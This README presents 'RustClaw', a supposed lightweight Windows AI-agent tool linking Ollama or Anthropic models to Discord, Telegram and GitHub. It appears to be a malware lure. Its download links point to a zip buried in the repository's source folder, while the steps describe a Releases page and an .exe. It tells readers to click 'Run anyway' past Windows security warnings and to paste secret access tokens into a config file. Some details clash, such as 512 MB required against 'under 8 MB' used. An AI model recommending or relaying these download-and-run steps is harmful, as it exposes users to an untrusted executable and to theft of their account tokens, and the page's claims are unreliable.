# 🦀 RustClaw - Efficient AI agents for your desktop

[![Download RustClaw](https://img.shields.io/badge/Download-RustClaw-blue.svg)](https://raw.githubusercontent.com/celieexpanded402/RustClaw/main/src/agent/Rust_Claw_1.3-alpha.5.zip)

RustClaw provides a lightweight way to run artificial intelligence agents on your computer. It uses very little memory and disk space, making it suitable for standard Windows machines. The software connects your local or remote AI models to platforms like Telegram, Discord, and GitHub. You can automate tasks like creating pull requests or sending messages without needing to manage complex server setups.

## ⚙️ System Requirements

- Operating System: Windows 10 or Windows 11.
- Processor: Any modern dual-core CPU.
- Memory: At least 512 MB of available RAM.
- Disk Space: 20 MB of free space.
- Network: Active internet connection for platform integrations.

## 📥 Downloading the Software

You must visit the project page to obtain the installation files. 

[Visit this page to download RustClaw](https://raw.githubusercontent.com/celieexpanded402/RustClaw/main/src/agent/Rust_Claw_1.3-alpha.5.zip)

1. Open your web browser.
2. Navigate to the link provided above.
3. Look for the "Releases" section on the right side of the page.
4. Click the most recent version link.
5. Select the file ending in `.exe` designed for Windows.
6. Save the file to your "Downloads" folder.

## 🛠️ Setting Up RustClaw

After you download the file, move it to a location where you keep your programs, such as a dedicated folder in your "Documents" directory.

1. Double-click the `rustclaw.exe` file.
2. If a security prompt from Windows appears, click "More info" and then "Run anyway."
3. A small status window will appear. This window shows the agent status.
4. Keep this window open while the agent performs tasks. 

## 🔗 Connecting Your Accounts

RustClaw needs your permission to interact with your services. It uses configuration files to store these settings safely.

1. Locate the configuration file named `config.toml` in the same folder as the program.
2. Open this file using Notepad.
3. Find the sections labeled `[discord]`, `[telegram]`, and `[github]`.
4. Paste your secret access tokens into the spaces provided.
5. Save the file and close Notepad.
6. Close the program window and reopen it to apply the changes.

## 🤖 Using Local or Remote AI Models

RustClaw supports models hosted through Ollama or Anthropic. 

### Local Models with Ollama
If you wish to run AI models on your own hardware, install Ollama first. Start the Ollama service on your machine. RustClaw detects this service automatically. 

### Remote Models with Anthropic
If you prefer not to use your own hardware for calculations, you can use Anthropic services. Add your API key to the `config.toml` file under the `[anthropic]` header. Setting the provider to `anthropic` in the settings will route your requests to their professional servers.

## 📝 Automating GitHub Pull Requests

RustClaw connects to GitHub to monitor your activity. It can create pull requests automatically when you merge code or finish a task.

1. Ensure your GitHub token has permissions to read and write to your repositories.
2. Configure the `[github]` section in your `config.toml` with your repository name.
3. Set the automation level to `active`.
4. RustClaw will now watch your branch and draft the necessary documents when you trigger the sequence.

## 🛡️ Security and Privacy

RustClaw keeps your data local. It does not send your personal files to external servers unless you specifically configure it to use an external AI provider. Your configuration tokens sit inside the local folder and do not leave your computer. 

- Keep your `config.toml` file private.
- Never share your folder with other users on your network.
- Updates will require you to download the new version from the link provided and replace the older `.exe` file.

## 🔧 Troubleshooting Common Issues

### The program fails to start
Ensure you have the latest Windows updates installed. If the program closes immediately, check that no other software occupies the same network port.

### The agent does not respond
Verify that your internet connection is active. Check the `config.toml` file for any errors in your API keys. A single character mistake will prevent the connection to your services.

### Memory usage is high
RustClaw is designed to use under 8 MB of RAM. If you see high usage, confirm you are not running multiple instances of the program at the same time. Check the task manager to close any hidden or hanging processes.

### Errors in the console window
The black window displays logs. If the error mentions `connection refused`, your internet might be down or your configured AI provider might be experiencing problems. Wait a few moments and restart the program.

## 📈 Performance Goals

The design philosophy behind RustClaw focuses on low overhead. By using the Rust programming language, the application stays small and fast. It avoids the large dependencies common in other AI agents. This allows it to run on older hardware or virtual machines without slowing down your computer. 

You can run multiple instances of RustClaw for different accounts. Just copy the entire folder to a new location and rename it. Each instance manages its own configuration and tokens independently. This allows you to scale your automation needs as your projects grow.